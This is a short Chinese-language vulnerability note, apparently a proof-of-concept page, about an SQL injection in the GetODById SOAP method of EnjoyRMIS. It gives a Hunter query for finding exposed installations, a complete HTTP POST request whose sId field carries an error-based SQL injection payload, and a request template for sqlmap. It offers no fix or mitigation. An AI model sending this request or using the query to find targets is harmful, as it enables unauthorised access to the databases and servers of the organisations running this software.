# EnjoyRMIS GetODById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetODById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征

![1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89.png](./img/EoBtxnlAiXH-mJkc/1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89-021809.png)

# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetODById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetODById xmlns="http://tempuri.org/">
      <sId>string' AND 8733 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8733=8733) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113))) AND 'atoN'='atoN</sId>
    </GetODById>
  </soap:Body>
</soap:Envelope>
```

![1700645309721-be2c91f3-6e6d-4708-a6b9-f1ba12fd61da.png](./img/EoBtxnlAiXH-mJkc/1700645309721-be2c91f3-6e6d-4708-a6b9-f1ba12fd61da-760939.png)

sqlmap

```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetODById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetODById xmlns="http://tempuri.org/">
      <sId>string</sId>
    </GetODById>
  </soap:Body>
</soap:Envelope>
```

![1700645332683-1eb00249-966d-49ac-9671-ef88f1c65b79.png](./img/EoBtxnlAiXH-mJkc/1700645332683-1eb00249-966d-49ac-9671-ef88f1c65b79-775568.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gryk74nk6kv4hgoh>